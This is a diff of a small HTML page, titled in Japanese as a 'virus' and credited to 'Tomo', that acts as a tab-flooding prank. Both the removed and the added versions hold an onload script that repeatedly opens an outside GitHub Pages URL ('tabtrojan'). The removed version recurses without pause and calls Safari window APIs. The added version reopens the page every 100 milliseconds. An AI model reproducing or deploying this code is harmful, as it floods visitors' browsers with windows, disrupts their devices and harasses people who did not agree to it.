@@ -1,32 +1,44 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>JavaScriptウイルス</title>
+    <title>ウイルス</title>
     <meta name="viewport" content="width=device-width, user-scalable=no">
     <style>
       body {
-        background: #252525;
-        color: #fff;
+        text-align: center;
+        font-family: sans-serif;
+        background: #fff;
+      }
+      .title {
         font-family: monospace;
-        font-size: 20px;
+        font-size: 25px;
+      }
+      #proport {
+        border: none;
+        border-radius: 6px;
+        box-shadow: 0px 0px 10px #737373;
+        padding: 10px 10px;
+        width: 90%;
+        text-align: center;
+		  
       }
     </style>
   </head>
-  <body onload="ios()">
-    <div id="virusport">
-      <span>嫌がらせVirus</span><br>
-      <span id="mesjan">閉じる時間を0.5秒与えてあげるよ！</span>
+  <body onload="virus()" onleave="go()">
+    <div id="proport">
+      <span class="title">ウイルス</span><br>
+      <span>By Tomo</span>
+      <script>
+        function virus() {
+          window.open("https://prazma.github.io/tabtrojan");
+          setTimeout( function () {
+            virus();
+          }, 100)
+        }
+        function go() {
+          alert("ウイルスプログラムが閉じます");
+        }
+      </script>
     </div>
-    <script>
-		function ios() {
-        	document.getElementById("mesjan").innerHTML = "バーン！";
-        	localStorage.trojan = "true";
-        	window.open("https://prazma.github.io/tabtrojan");
-			var myWin = safari.application.openBrowserWindow("https://prazma.github.io/tabtrojan");
-			browserWindow.openTab("https://prazma.github.io/tabtrojan");
-			myWin;
-			ios();
-		}
-    </script>
   </body>
 </html>
